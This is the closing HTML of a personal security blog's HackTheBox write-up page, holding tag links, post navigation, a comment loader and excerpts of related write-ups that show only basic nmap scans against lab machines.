<a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/microsoft-azure/">microsoft azure</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/gtfobins/">gtfobins</a> <a class="post-tag" href="/tags/docker/">docker</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/admirer/" class="btn btn-outline-primary"><p>Admirer</p></a> <a href="/posts/traceback/" class="btn btn-outline-primary"><p>Traceback</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-4"><p class="font-italic text-muted small">Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xyassine.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://0xyassine.github.io//posts/cache/'; this.page.identifier = '/posts/cache/'; } }; $.disqusLoader('#disqus', options); </script> <!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/openadmin/"><div class="card-body"> <span class="timeago small"> May 1, 2020 <i class="unloaded">2020-05-01T00:00:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OpenAdmin</h3><div class="text-muted small"><p>OpenAdmin from HackTheBox OpenAdmin was retired .It was easy and fun box with web attack and priv escalation techniques so let’s start … nmap scan: 1 nmap -sV -sC 10.10.10.171 -v 1 2 3 4 5...</p></div></div></a></div><div class="card"> <a href="/posts/obscurity/"><div class="card-body"> <span class="timeago small"> May 8, 2020 <i class="unloaded">2020-05-08T00:00:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Obscurity</h3><div class="text-muted small"><p>Obscurity from HackTheBox Obscurity was retired . It was a Good box with a lot of python auditing … nmap scan 1 nmap -sV -sC -v 10.10.10.168 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19...</p></div></div></a></div><div class="card"> <a href="/posts/ForwardSlash/"><div class="card-body"> <span class="timeago small"> May 9, 2020 <i class="unloaded">2020-05-09T00:00:00+03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ForwardSlash</h3><div class="text-muted small"><p>ForwardSlash from HackTheBox Good box with new bypassing techniques and simple cryto … Note : add forwardslash.htb to your hosts file nmap scan 1 nmap -sV -sC forwardslash.htb -v 1 2 ...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const observer = lozad(); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://www.facebook.com/mouhamed.yassin.90">Mohammad YASSINE</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/web-shell/">web shell</a> <a class="post-tag" href="/tags/sqlmap/">sqlmap</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/microsoft-azure/">microsoft azure</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/gtfobins/">gtfobins</a> <a class="post-tag" href="/tags/docker/">docker</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://0xyassine.github.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
